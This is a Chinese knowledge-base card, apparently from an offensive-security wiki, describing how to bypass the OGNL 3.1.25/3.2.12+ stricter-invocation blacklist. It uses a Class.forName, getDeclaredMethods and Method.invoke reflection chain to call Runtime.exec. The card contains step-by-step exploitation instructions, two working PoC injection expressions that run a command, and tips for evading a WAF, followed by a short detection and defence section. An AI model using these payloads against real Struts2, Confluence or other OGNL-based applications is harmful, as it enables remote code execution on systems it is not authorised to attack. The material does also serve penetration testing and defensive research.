---
id: web-java-expression-ognl-high-version-reflection-invoke-bypass
title: OGNL 高版本黑名单反射绕过：Class.forName + Method.invoke 调用 Runtime
type: scenario
domain: web
path: web/java/expression/ognl
technique: ognl-reflection-invoke-bypass
tags:
- java
- ognl
- expression-injection
- waf-bypass
- reflection
- runtime
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: '>=3.1.25、>=3.2.12（_useStricterInvocation 黑名单版本）'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:27:34+08:00'
  notes: '已对照原文核对：图08黑名单源码与卡内原理一致；图19-23实测 #this.getClass().forName(System Runtime)+getDeclaredMethods+methods[7]/[14].invoke 成功弹出计算器，OGNL 3.1.25；图07直接调用抛stricter invocation异常。未验证点：未在本机复跑PoC；frontmatter无sources/source_url；methods[7]/[14]下标依JDK/OGNL版本，卡内已提示按名查找。'
url: /docs/web/java/expression/ognl/web-java-expression-ognl-high-version-reflection-invoke-bypass/
draft: false
kb_aliases:
- OGNL 反射绕过
- OgnlRuntime.invokeMethod 黑名单绕过
- Class.forName Method.invoke
- methods[7] methods[14] Runtime
- OGNL 3.1.25 绕过
- OGNL 3.2.12 绕过
---

## 一句话结论

OGNL 3.1.25/3.2.12 起在 `OgnlRuntime.invokeMethod` 中按“被调用方法的声明类”做黑名单，禁止直接调用 `Runtime`、`ClassLoader`、`ProcessBuilder` 等；改用 `Class.forName → getDeclaredMethods → Method.invoke` 的反射链，所有中间方法的声明类都是 `Class`/`Method`（不在黑名单），即可间接调用 `Runtime.getRuntime().exec()`。

## 原理

- 新版 OGNL 在 `_useStricterInvocation` 为 true 时检查：
  - 精确方法：`AccessibleObject.setAccessible`、`System.exit`、`System.console` 等；
  - 声明类：`AccessibleObjectHandler`、`ClassResolver`、`MethodAccessor`、`MemberAccess`、`OgnlContext`、`Runtime`、`ClassLoader`、`ProcessBuilder`、`AccessibleObjectHandlerJDK9Plus` 及其子类/实现类。
- 直接写 `@java.lang.Runtime@getRuntime().exec('calc')` 时，`getRuntime` 的声明类是 `Runtime`，命中 `Runtime.class.isAssignableFrom(methodDeclaringClass)`，抛 `IllegalAccessException`。
- 绕过思路：黑名单检查的是**当前 OGNL 要 invoke 的 Method 对象的声明类**，而不是它最终反射调用的目标方法。选择声明类不在黑名单的反射原语：
  - `#this.getClass()` → `Object.getClass`，声明类 `Object`；
  - `.forName("java.lang.Runtime")` → `Class.forName`，声明类 `Class`；
  - `.getDeclaredMethods()` → 声明类 `Class`；
  - `Method.invoke(...)` → 声明类 `Method`。
- 拿到 `Runtime` 的 `Method[]` 后，用 `methods[i].invoke(null, null)` 调用 `getRuntime()` 得到 Runtime 实例，再用 `methods[j].invoke(runtime, "calc")` 调用 `exec(String)`。整个过程中 OGNL 只直接 invoke 了 `Class`/`Method` 的方法，黑名单不匹配。
- 下标 `7`/`14` 依赖 JDK 与 OGNL 版本的方法顺序；实战应先在相同环境枚举 `getDeclaredMethods()`，或改用 `getMethod("getRuntime")` / `getMethod("exec", String.class)` 按名查找。

## 触发条件

- 存在 OGNL 表达式注入点（Struts2、Confluence 等），且 `_useStricterInvocation` 开启（3.1.25/3.2.12+ 默认行为）。
- OGNL 仅按声明类做黑名单，未额外禁止 `Class.forName`、`getDeclaredMethods`、`Method.invoke`。
- 目标 JDK 的 `Runtime` 方法可通过反射访问（无 SecurityManager/模块阻断）。
- 注入表达式能访问 `#this`（根对象）或任意对象以取得 `Class`。

## 利用步骤

1. 确认 OGNL 注入与版本（>=3.1.25/3.2.12）。
2. 在相同 JDK 环境枚举 `Runtime.class.getDeclaredMethods()`，找到 `getRuntime` 与 `exec(String)` 的下标，或改用按名查找。
3. 构造链式表达式：取 `#this.getClass()` → `forName("java.lang.Runtime")` → `getDeclaredMethods()` → `Method.invoke` 取 Runtime 实例 → `Method.invoke` 执行命令。
4. 发送表达式，观察命令执行/延时/回显。
5. 若 WAF 拦截关键字，可进一步拆分字符串、用变量 `#a` 拼接类名/命令。

## PoC

文章在 OGNL 3.1.25 环境验证的表达式：

```text
(
  #clazz = #this.getClass().forName("java.lang.Runtime")
).(
  #methods = #clazz.getDeclaredMethods()
).(
  #runtime = #methods[7].invoke(null, null)
).(
  #exec = #methods[14]
).(
  #exec.invoke(#runtime, "calc")
)
```

等价的按名查找写法（不依赖下标）：

```text
(
  #c = #this.getClass().forName("java.lang.Runtime")
).(
  #rt = #c.getMethod("getRuntime").invoke(null, null)
).(
  #c.getMethod("exec", #this.getClass().forName("java.lang.String")).invoke(#rt, "calc")
)
```

直接调用 `@java.lang.Runtime@getRuntime().exec('calc')` 在新版会抛
`IllegalAccessException: Method [public static java.lang.Runtime java.lang.Runtime.getRuntime()] cannot be called from within OGNL invokeMethod() under stricter invocation mode.`

## 变体与关联

- 变体：反射 `ProcessBuilder`、`ClassLoader`、`ScriptEngineManager` 等黑名单类；用 `getDeclaredConstructors()`/`newInstance` 替代 `Method.invoke`。
- 变体：用 `#this.getClass().forName(...)` 之外的 `ClassLoader.loadClass` 路径（若可用）。
- 关联：[[web-java-expression-ognl-jshell-eval-bypass]]（同版本黑名单的另一种绕过）、[[web-java-framework-struts2-s2-067-ognl-upload-filename-bypass]]。
- 边界：若目标额外在 WAF/OGNL 自定义 MemberAccess 中禁止 `forName`/`getDeclaredMethods`/`invoke`，该链会被截断；需要换其他反射原语。

## 检测与防御

- 升级 OGNL 并保持 `_useStricterInvocation` 开启只是基线；应使用 `MemberAccess` 白名单限制可访问的类/方法，而不是只依赖类级黑名单。
- 禁止不可信输入进入 OGNL；对 Struts2 等框架及时打补丁，关闭不必要的 OGNL 求值。
- 检测表达式中的 `forName`、`getDeclaredMethods`、`getDeclaredConstructors`、`Method.invoke`、`getMethod` 组合，以及 `java.lang.Runtime`/`ProcessBuilder` 间接反射调用。
- 运行时监控 `Class.forName("java.lang.Runtime")`、`Method.invoke` 调用 `Runtime.getRuntime`/`ProcessBuilder.start`，并对 OGNL 求值做沙箱。
- 限制 `Runtime.exec` 与进程创建权限，部署 RASP 拦截反射调用链。
